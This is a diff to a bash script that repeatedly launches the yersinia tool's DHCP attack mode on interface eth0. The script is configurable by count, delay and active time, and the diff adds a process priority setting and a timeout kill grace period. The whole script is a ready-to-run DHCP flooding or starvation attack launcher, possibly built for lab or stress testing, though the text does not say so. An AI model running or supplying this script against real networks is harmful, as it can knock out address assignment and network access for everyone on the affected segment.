@@ -5,6 +5,7 @@ COUNT="${COUNT:-1}"
 DELAY_MS="${DELAY_MS:-1000}"
 DURATION_S="${DURATION_S:-0}"
 ACTIVE_S="${ACTIVE_S:-5}"
+NICE_LEVEL="${NICE_LEVEL:-10}"
 HOLD_GRACE_S="${HOLD_GRACE_S:-5}"
 
 if [ "${DURATION_S}" -gt 0 ] && [ "${ACTIVE_S}" -gt "${DURATION_S}" ]; then
@@ -33,7 +34,7 @@ cleanup() {
 trap cleanup EXIT INT TERM
 
 for _ in $(seq 1 "${COUNT}"); do
-  timeout "${ACTIVE_S}s" /usr/bin/yersinia dhcp -attack 1 -interface eth0 &
+  timeout -k 2s "${ACTIVE_S}s" nice -n "${NICE_LEVEL}" /usr/bin/yersinia dhcp -attack 1 -interface eth0 &
   pids+=("$!")
   sleep_ms "${DELAY_MS}"
 done
